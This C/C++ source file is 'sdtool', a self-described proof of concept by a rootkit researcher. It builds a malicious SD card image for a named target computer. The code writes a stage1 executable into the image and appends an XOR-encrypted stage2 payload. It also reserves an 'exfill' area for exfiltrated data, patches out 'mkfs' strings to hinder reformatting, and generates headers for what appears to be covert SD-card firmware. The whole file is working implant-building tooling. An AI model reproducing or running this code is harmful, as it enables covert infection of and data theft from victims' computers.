// This is an open source non-commercial project. Dear PVS-Studio, please check it.
// PVS-Studio Static Code Analyzer for C, C++, C#, and Java: http://www.viva64.com

/*
sdtool - MIT License - Copyright 2020
-
David Reguera Garcia aka Dreg - dreg@fr33project.org
-
http://www.rootkit.es/
http://github.com/David-Reguera-Garcia-Dreg/
http://www.fr33project.org/
-
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
IN THE SOFTWARE.

WARNING! this is a POC, the code is CRAP
*/


#ifndef ASPRINTF_H
#define ASPRINTF_H

#if defined(__GNUC__) && ! defined(_GNU_SOURCE)
    #define _GNU_SOURCE /* needed for (v)asprintf, affects '#include <stdio.h>' */
#endif
#include <stdio.h>  /* needed for vsnprintf    */
#include <stdlib.h> /* needed for malloc, free */
#include <stdarg.h> /* needed for va_*         */

/*
* vscprintf:
* MSVC implements this as _vscprintf, thus we just 'symlink' it here
* GNU-C-compatible compilers do not implement this, thus we implement it here
*/
#ifdef _MSC_VER
    #define vscprintf _vscprintf
#endif

#ifdef __GNUC__
int vscprintf(const char* format, va_list ap)
{
    va_list ap_copy;
    va_copy(ap_copy, ap);
    int retval = vsnprintf(NULL, 0, format, ap_copy);
    va_end(ap_copy);
    return retval;
}
#endif

/*
* asprintf, vasprintf:
* MSVC does not implement these, thus we implement them here
* GNU-C-compatible compilers implement these with the same names, thus we
* don't have to do anything
*/
#ifdef _MSC_VER
int vasprintf(char** strp, const char* format, va_list ap)
{
    int len = vscprintf(format, ap);
    if (len == -1)
    {
        return -1;
    }
    char* str = (char*)malloc((size_t)len + 1);
    if (!str)
    {
        return -1;
    }
    int retval = vsnprintf(str, len + 1, format, ap);
    if (retval == -1)
    {
        free(str);
        return -1;
    }
    *strp = str;
    return retval;
}

int asprintf(char** strp, const char* format, ...)
{
    va_list ap;
    va_start(ap, format);
    int retval = vasprintf(strp, format, ap);
    va_end(ap);
    return retval;
}
#endif

#endif // ASPRINTF_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <iostream>
#include <utility>
#include <vector>
#include <map>


#define MIRROR_START_SECTOR  21000
#define STAGE2_START_SECTOR 43000


void print_content_file(char* file_name, FILE* file)
{
    printf("\n\nfile content: %s\n-------------\n", file_name);
    char current_sector[512 + 1] = { 0 };
    long orig_set = ftell(file);

    fseek(file, 0L, SEEK_SET);
    while (fread(current_sector, 1, 512, file) > 0)
    {
        printf("%s", current_sector);
        memset(current_sector, 0, 512);
    }
    fseek(file, orig_set, SEEK_SET);
    puts("\n-------------");
}

using namespace std;

typedef map<uint8_t, vector <pair <uint32_t, uint32_t>>> my_map_t;

typedef struct
{
    my_map_t map;
    uint8_t last_byte_val;
    bool init;
} the_map_t;
/*
{
{ 0x69, { { 2, 5 }, { 8, 9 } } },
{ 0x23, { { 1, 4 }, { 3, 21 } } },
{ 0x21, { { 8, 8 } } }
};
*/

#include <time.h>


char* get_time_cmt_str(void)
{
    static char* curr_time_str;

    if (NULL == curr_time_str)
    {
        time_t rawtime = { 0 };
        struct tm* timeinfo = { 0 };

        time(&rawtime);
        timeinfo = localtime(&rawtime);
        asprintf(&curr_time_str,
                 "\n\n// Created %s \n",
                 asctime(timeinfo));
    }

    return curr_time_str;
}

void print_map(the_map_t& map)
{
    if (!map.init || map.map.size() == 0)
    {
        return;
    }

    puts("-");
    for (auto x : map.map)
    {
        printf("0x%02X\n", x.first);
        for (auto h : x.second)
        {
            printf("    %d - %d\n", h.first, h.second);
        }
    }
    puts("-");

}

void flush_map(the_map_t& map)
{
    if (!map.init || map.map.size() == 0)
    {
        return;
    }

    if (map.map[map.last_byte_val].back().first ==
            map.map[map.last_byte_val].back().second)
    {
        map.map[map.last_byte_val].pop_back();
    }

    if (map.map[map.last_byte_val].size() == 0)
    {
        map.map.erase(map.last_byte_val);
    }
}

void add_byte_val(the_map_t& map, uint8_t byte_val, uint32_t nr_sector)
{
    if (!map.init)
    {
        map.init = true;
        map.map.insert({ byte_val, { { nr_sector, nr_sector } } });
        goto endf;
    }

    if (map.last_byte_val != byte_val)
    {
        flush_map(map);

        if (!map.map.count(byte_val))
        {
            map.map.insert({ byte_val, { { nr_sector, nr_sector } } });
            goto endf;
        }

        map.map[byte_val].push_back({ nr_sector, nr_sector });
        goto endf;
    }

    if (map.map[byte_val].back().second + 1 == nr_sector)
    {
        map.map[byte_val].back().second++;
        goto endf;
    }

    map.map[byte_val].push_back({ nr_sector, nr_sector });

endf:
    map.last_byte_val = byte_val;
    return;
}

void init_map(the_map_t& map)
{
    map.init = false;
}

void finish_map(the_map_t& map)
{
    flush_map(map);
}

void test_map(void)
{
    the_map_t map;

    init_map(map);
    print_map(map);
    add_byte_val(map, 0x56, 0);
    add_byte_val(map, 0x17, 1);
    print_map(map);
    add_byte_val(map, 0x23, 5);
    add_byte_val(map, 0x23, 6);
    add_byte_val(map, 0x23, 7);
    add_byte_val(map, 0x23, 9);
    print_map(map);
    add_byte_val(map, 0, 15);
    add_byte_val(map, 0x69, 18);
    add_byte_val(map, 0x23, 22);
    add_byte_val(map, 0x23, 23);
    print_map(map);
    add_byte_val(map, 0x16, 88);
    print_map(map);
    add_byte_val(map, 0x3, 100);
    add_byte_val(map, 0x3, 101);
    add_byte_val(map, 0x3, 102);
    add_byte_val(map, 0x3, 103);
    add_byte_val(map, 0x3, 104);
    print_map(map);
    finish_map(map);
    print_map(map);
}


void print_sector(uint8_t* sector)
{
    printf("-");
    for (int i = 0; i < 512; i++)
    {
        if (i % 16 == 0)
        {
            puts("");
        }
        printf("%02X ", sector[i]);
    }
    puts("\n-");
}

bool is_seq_sector(uint8_t* current_sector)
{
    bool secuenced = true;
    uint16_t last_int = ((uint16_t*)current_sector)[0];

    last_int--;
    for (int i = 0; i < 256; i++)
    {
        uint16_t current_int = ((uint16_t*)current_sector)[i];
        if (current_int != last_int + 1)
        {
            secuenced = false;
            break;
        }
        last_int = current_int;
    }

    return secuenced;
}

typedef struct
{
    uint32_t start_sector;
    uint32_t end_sector;
    uint16_t start_value;
} rel_sec_t;

typedef vector<rel_sec_t> map_seq_t;

void add_map_seq(map_seq_t& map, uint16_t start_val, uint32_t nr_sector)
{
    static uint16_t last_val;
    static bool init;

star:
    if (!init)
    {
        init = true;
        map.push_back({ nr_sector, nr_sector, start_val });
        goto endf;
    }

    if (map.back().end_sector + 1 == nr_sector && start_val == last_val)
    {
        map.back().end_sector++;
        goto endf;
    }

    init = false;
    goto star;

endf:
    last_val = start_val + 256;
    return;
}

void print_map_seq(map_seq_t& map)
{
    puts("-");
    for (auto x : map)
    {
        printf("%d --> %d - %d\n", x.start_value, x.start_sector, x.end_sector);
    }
    puts("-");
}


void test_map_seq(void)
{
    map_seq_t map_seq;

    add_map_seq(map_seq, 257, 5);
    add_map_seq(map_seq, 513, 6);
    add_map_seq(map_seq, 769, 7);
    add_map_seq(map_seq, 1, 8);
    add_map_seq(map_seq, 100, 9);
    add_map_seq(map_seq, 356, 10);
    print_map_seq(map_seq);
}


void gencode(FILE* out_file,
             my_map_t& the_map,
             map_seq_t& map_seq,
             long stage1_end_sector_in_d,
             long stage2_end_sector_in_d)
{
    puts("generating code...\n");

    fprintf(out_file, "\n\nk = 1;\n\n");

    fprintf(out_file, "static uint8_t b_0x64[16] = {");
    for (int i = 0; i < 16; i++)
    {
        fprintf(out_file, " 0x64%c", i == 15 ? ' ' : ',');
    }
    fprintf(out_file, "};\n\n\n");

    if (the_map.count(0x64))
    {
        auto sector_d_first_stage = the_map[0x64];
        the_map.erase(0x64);
        auto sector_d_second_stage = sector_d_first_stage;
        auto sector_d_exfill_stage = sector_d_first_stage;

        for (auto& j : sector_d_exfill_stage)
        {
            fprintf(out_file,
                    "if (eppr_vars.curr_stage == STAG_EXFILL && BlockAddress >= %d && BlockAddress <= %d)\n{\n    sec_ptr = b_0x64; k = 0; goto retsec;\n}\n\n\n",
                    j.first, j.second);

            break;
        }

        for (auto& j : sector_d_first_stage)
        {
            if (stage1_end_sector_in_d > j.first && stage1_end_sector_in_d < j.second)
            {
                j.first = stage1_end_sector_in_d;
                printf("now first opti d area in stage1 points to: %d\n", j.first);

                fprintf(out_file,
                        "if (eppr_vars.curr_stage == STAG_1 && BlockAddress >= %d && BlockAddress <= %d)\n{\n    sec_ptr = b_0x64; k = 0; goto retsec;\n}\n\n\n",
                        j.first, j.second);

                break;
            }
        }

        for (auto& j : sector_d_second_stage)
        {
            if (stage2_end_sector_in_d > j.first && stage2_end_sector_in_d < j.second)
            {
                j.first = stage2_end_sector_in_d;
                printf("now first opti d area in stage2 points to: %d\n", j.first);

                fprintf(out_file,
                        "if (eppr_vars.curr_stage == STAG_2 && BlockAddress >= %d && BlockAddress <= %d)\n{\n    sec_ptr = b_0x64; k = 0; goto retsec;\n}\n\n\n",
                        j.first, j.second);

                break;
            }
        }
    }

    for (auto h : the_map)
    {
        fprintf(out_file, "static uint8_t b_0x%02X[16] = {", h.first);
        for (int i = 0; i < 16; i++)
        {
            fprintf(out_file, " 0x%02X%c", h.first, i == 15 ? ' ' : ',');
        }
        fprintf(out_file, "};\n\n\n");

        fprintf(out_file, "if (");
        bool first = false;
        for (auto j : h.second)
        {
            fprintf(out_file, "%s\n    (BlockAddress >= %d && BlockAddress <= %d)",
                    first ? " ||" : " ",
                    j.first,
                    j.second);
            first = true;
        }
        fprintf(out_file, "\n)\n{\n");
        fprintf(out_file, "    sec_ptr = b_0x%02X; k = 0; goto retsec;\n}\n\n",
                h.first);
    }
    print_content_file("optimized file", out_file);
}


void* mymemmem(void* haystack,
               size_t haystack_len,
               void* const needle,
               size_t needle_len)
{
    if (haystack == NULL)
    {
        return NULL;
    }
    if (haystack_len == 0)
    {
        return NULL;
    }
    if (needle == NULL)
    {
        return NULL;
    }
    if (needle_len == 0)
    {
        return NULL;
    }

    for (unsigned char* h = (unsigned char*)haystack;
            haystack_len >= needle_len;
            ++h, --haystack_len)
    {
        if (!memcmp(h, needle, needle_len))
        {
            return h;
        }
    }
    return NULL;
}

void mkfs_p(FILE* sd_file)
{
    char current_sector[512] = { 0 };
    int current_sector_nr = 0;
    unsigned char* mkfs = NULL;

    fseek(sd_file, 0L, SEEK_SET);
    while (current_sector_nr < MIRROR_START_SECTOR - 1)
    {
        if (fread(current_sector, 1, 512, sd_file) != 512)
        {
            goto endf;
        }
        mkfs = (unsigned char*)mymemmem(current_sector, 512, "mkfs", 4);
        if (NULL != mkfs)
        {
            mkfs[0] = 0x64;
            mkfs[1] = 0x72;
            mkfs[2] = 0x65;
            mkfs[3] = 0x67;
            fseek(sd_file, current_sector_nr * 512, SEEK_SET);
            fwrite(current_sector, 1, 512, sd_file);
            fseek(sd_file, current_sector_nr * 512, SEEK_SET);
            continue;
        }
        current_sector_nr++;
    }

endf:
    fseek(sd_file, 0L, SEEK_SET);
}

int sdtool_f(FILE* sd_file,
             FILE* stage1_file,
             FILE* stage2_file,
             FILE* dyn_file,
             FILE* opti_file,
             char* target_laptop_name)
{
    int retf = 1;
    long stage1_end_sector_in_d;
    long stage2_end_sector_in_d;

    long total_sectors_optimized = 0;

    fseek(sd_file, 0L, SEEK_END);
    long total_sectors = ftell(sd_file) / 512;
    printf("total sectors: %ld\n", total_sectors);
    if (total_sectors < 3)
    {
        fprintf(stderr, "\nerror:  wtf, file with a few sectors???\n");
        return retf;
    }
    fseek(sd_file, 0L, SEEK_SET);

    int d_sector_start = 0;
    int current_sector_nr = 0;
    uint8_t current_sector[512];
    uint8_t d_sector[512];
    int d_sector_end_nr = 0;
    memset(d_sector, 'd', 512);
    while (!d_sector_end_nr && fread(current_sector, 1, 512, sd_file) == 512)
    {
        if (memcmp(current_sector, d_sector, 512) == 0)
        {
            printf("d_sector reached: %d, searching end...\n", current_sector_nr);
            d_sector_start = current_sector_nr;
            current_sector_nr++;
            while (!d_sector_end_nr && fread(current_sector, 1, 512, sd_file) == 512)
            {
                if (memcmp(current_sector, d_sector, 512) != 0)
                {
                    d_sector_end_nr = current_sector_nr;
                }
                current_sector_nr++;
            }
        }
        current_sector_nr++;
    }
    if (0 == d_sector_end_nr)
    {
        fprintf(stderr, "no end d_sector wtf, bad sd image\n");
        return 1;
    }

    printf("d_sector_end_nr: %d\n", d_sector_end_nr);

    the_map_t the_map;
    map_seq_t map_seq;
    init_map(the_map);
    uint8_t eq_byte_sector[512];
    fseek(sd_file, 0L, SEEK_SET);
    current_sector_nr = 0;
    while (fread(current_sector, 1, 512, sd_file) == 512)
    {
        memset(eq_byte_sector, *current_sector, 512);
        if (memcmp(current_sector, eq_byte_sector, 512) == 0)
        {
            add_byte_val(the_map, *current_sector, current_sector_nr);
        }
        else
        {
            if (is_seq_sector(current_sector))
            {
                add_map_seq(map_seq, ((uint16_t*)current_sector)[0], current_sector_nr);
            }
        }
        current_sector_nr++;
        if (current_sector_nr == d_sector_end_nr)
        {
            add_byte_val(the_map, 'd', current_sector_nr);
            break;
        }
    }

    finish_map(the_map);
    print_map(the_map);
    print_map_seq(map_seq);
    /*
    for (auto h : the_map.map)
    {
        for (auto j : h.second)
        {
            total_sectors_optimized += (j.second + 1) - j.first;
        }
    }

    for (auto j : map_seq)
    {
        total_sectors_optimized += (j.end_sector + 1) - j.start_sector;
    }


    printf("total_sectors_optimized: %d (%f%%) from %d\nsectors not optimized: %d\n",
           total_sectors_optimized,
           (double)total_sectors_optimized / total_sectors * 100, total_sectors,
           total_sectors - total_sectors_optimized);

    //gencode(out_file, the_map.map, map_seq);
    */

    mkfs_p(sd_file);

    fseek(stage1_file, 0L, SEEK_END);
    long total_sectors_stage1 = ftell(stage1_file) / 512;
    printf("total sectors stage1: %ld\n", total_sectors_stage1);
    fseek(stage1_file, 0L, SEEK_SET);

    fseek(stage2_file, 0L, SEEK_END);
    long total_sectors_stage2 = ftell(stage2_file) / 512;
    printf("total sectors stage2: %ld\n", total_sectors_stage2);
    fseek(stage2_file, 0L, SEEK_SET);

    if (total_sectors >= MIRROR_START_SECTOR)
    {
        fprintf(stderr,
                "\nerror:  wtf, stage2 or mirror area already added, you must use a clean sd image\n");
        return 1;
    }

    current_sector_nr = 0;
    memset(current_sector, 'P', 512);
    current_sector_nr = total_sectors;
    fseek(sd_file, 0L, SEEK_END);
    printf("creating padding to mirror start, sector: %d\n", ftell(sd_file) / 512);
    while (current_sector_nr < MIRROR_START_SECTOR)
    {
        fwrite(current_sector, 1, 512, sd_file);
        current_sector_nr++;
    }
    printf("creating mirror area to stage2, sector: %d\n", ftell(sd_file) / 512);
    memset(current_sector, 'M', 512);
    while (current_sector_nr < STAGE2_START_SECTOR)
    {
        fwrite(current_sector, 1, 512, sd_file);
        current_sector_nr++;
    }
    printf("writing and encrypting stage2 with XOR KEY 0x69), sector: %d\n",
           ftell(sd_file) / 512);
    while (fread(current_sector, 1, 512, stage2_file) > 0)
    {
        for (int j = 0; j < 512; j++)
        {
            current_sector[j] ^= 0x69;
        }
        fwrite(current_sector, 1, 512, sd_file);
        memset(current_sector, 0, 512);
    }
    printf("creating exfill area, sector: %d\n", ftell(sd_file) / 512);
    memset(current_sector, 'E', 512);
    fwrite(current_sector, 1, 512, sd_file);

    fprintf(dyn_file, "#ifndef DYN_FILE_H_\n#define DYN_FILE_H_ \n\n");

    fprintf(dyn_file,
            "#define XOR_KEY_BYTE 0x69\n"
            "#define TARGET_COMPUTER_NAME \"%s\"\n"
            "#define MIRROR_START_SECTOR %d\n"
            "#define STAGE2_START_SECTOR %d\n"
            "#define STAGE2_END_SECTOR %d\n"
            "#define STAGE2_TOTAL_SECTORS %d\n"
            "#define EXFILL_AREA_START_SECTOR %ld\n",
            target_laptop_name,
            MIRROR_START_SECTOR,
            STAGE2_START_SECTOR,
            (STAGE2_START_SECTOR + total_sectors_stage2) - 1,
            total_sectors_stage2,
            STAGE2_START_SECTOR + total_sectors_stage2 + 1
           );

    fseek(sd_file, 0L, SEEK_SET);

    unsigned char r_sect[512];
    memset(r_sect, 'r', 512);
    current_sector_nr = 0;
    while (fread(current_sector, 1, 512, sd_file) == 512)
    {
        if (memcmp(current_sector, r_sect, 512) == 0)
        {
            stage1_end_sector_in_d = d_sector_start + total_sectors_stage1;
            stage2_end_sector_in_d = d_sector_start + total_sectors_stage2;
            fprintf(dyn_file,
                    "#define R_SECTOR %d\n"
                    "#define STAGE1_START_SECTOR %d\n"
                    "#define STAGE1_END_SECTOR %d\n"
                    "#define STAGE1_TOTAL_SECTORS %d\n",
                    current_sector_nr,
                    d_sector_start,
                    stage1_end_sector_in_d,
                    total_sectors_stage1);
        }
        else if (current_sector_nr == d_sector_start)
        {
            // very buggy I know..
            printf("found d sector: %d\n", current_sector_nr);
            fprintf(dyn_file, "#define D_SECTOR %d\n", current_sector_nr);
            fseek(sd_file, total_sectors_stage1 * 512, SEEK_CUR);
            if (fread(current_sector, 1, 512, sd_file) == 512)
            {
                if (memcmp(current_sector, d_sector, 512) == 0)
                {
                    fseek(sd_file, current_sector_nr * 512, SEEK_SET);
                    while (fread(current_sector, 1, 512, stage1_file) > 0)
                    {
                        fwrite(current_sector, 1, 512, sd_file);
                        memset(current_sector, 0, 512);
                    }
                    fflush(sd_file);
                    fclose(sd_file);
                    puts("\nstage1 written!\n");

                    fprintf(dyn_file, "\n\n#endif // DYN_FILE_H_ \n\n");

                    print_content_file("dynamic file", dyn_file);

                    gencode(opti_file,
                            the_map.map,
                            map_seq,
                            stage1_end_sector_in_d,
                            stage2_end_sector_in_d);


                    return 0;
                }
            }
            fprintf(stderr, "error, stage1 is too huge, use less size\n");
            break;
        }
        current_sector_nr++;
    }

    return retf;
}

int sdtool(int argc, char* argv[])
{
#define SYNTAX_USE "sdtool.exe sd_dumped.img stage1.exe stage2.exe dyn_file.h opti.h target_computer_name"
    int retf = 1;

    puts("\n-\n"
         "sdtool (MIT LICENSE) by David Reguera Garcia aka Dreg - dreg@fr33project.org\n"
         "http://www.fr33project.org - https://github.com/David-Reguera-Garcia-Dreg\n"
         "    syntax: " SYNTAX_USE " - examples:\n\n"
         "    sdtool.exe sd_dumped.img stage1.exe stage2.exe dyn_file.h opti.h dreglaptop\n\n"
         "\n-\n");

    for (int i = 1; i < argc; i++)
    {
        for (int j = 1; j < argc; j++)
        {
            if (strcmpi(argv[i], argv[j]) == 0)
            {
                if (j == i)
                {
                    continue;
                }
                fprintf(stderr, "error, dont use the same file names: %s %s\n",
                        argv[i],
                        argv[j]);
                return 1;
            }
        }
    }

    if (7 != argc)
    {
        fprintf(stderr, "\nerror: bad args, use: " SYNTAX_USE "\n");
        return 1;
    }

    FILE* sd_file = fopen(argv[1], "rb");
    if (NULL == sd_file)
    {
        perror(argv[1]);
        printf("sd_file must be exist: %s\n", argv[1]);
        return 1;
    }
    sd_file = fopen(argv[1], "rb+");
    if (NULL == sd_file)
    {
        perror(argv[1]);
        return 1;
    }
    printf("open sd_file: %s\n", argv[1]);

    FILE* stage1_file = fopen(argv[2], "rb");
    if (NULL == stage1_file)
    {
        printf("stage1_file must be exist: %s\n", argv[2]);
        perror(argv[2]);
    }
    else
    {
        printf("open stage1_file: %s\n", argv[2]);

        FILE* stage2_file = fopen(argv[3], "rb");
        if (NULL == stage2_file)
        {
            printf("stage2_file must be exist: %s\n", argv[3]);
            perror(argv[3]);
        }
        else
        {
            printf("open stage2_file: %s\n", argv[3]);

            FILE* dyn_file = fopen(argv[4], "rb");
            if (NULL != dyn_file)
            {
                fprintf(stderr, "error, dyn_file_name must be no exist: %s\n", argv[4]);
                perror(argv[4]);
                fclose(dyn_file);
            }
            else
            {
                dyn_file = fopen(argv[4], "wb+");
                if (NULL == dyn_file)
                {
                    perror(argv[4]);
                }
                else
                {
                    printf("open dyn_file: %s\n", argv[4]);
                    fprintf(dyn_file, get_time_cmt_str());
                    FILE* opti_file = fopen(argv[5], "rb");
                    if (NULL != opti_file)
                    {
                        fprintf(stderr, "error, opti_file must be no exist: %s\n", argv[5]);
                        perror(argv[5]);
                        fclose(opti_file);
                    }
                    else
                    {
                        opti_file = fopen(argv[5], "wb+");
                        if (NULL == opti_file)
                        {
                            perror(argv[5]);
                        }
                        else
                        {
                            printf("open opti_file: %s\n", argv[5]);
                            fprintf(opti_file, get_time_cmt_str());
                            retf = sdtool_f(sd_file,
                                            stage1_file,
                                            stage2_file,
                                            dyn_file,
                                            opti_file,
                                            argv[6]);
                            fclose(opti_file);
                        }
                    }
                    fclose(dyn_file);
                }
            }
        }
        fclose(stage1_file);
    }
    fclose(sd_file);

    return retf;
}


int main(int argc, char* argv[])
{
    int retf;

    retf = sdtool(argc, argv);

    puts("\npress ENTER to exit.");
    getchar();

    return retf;
}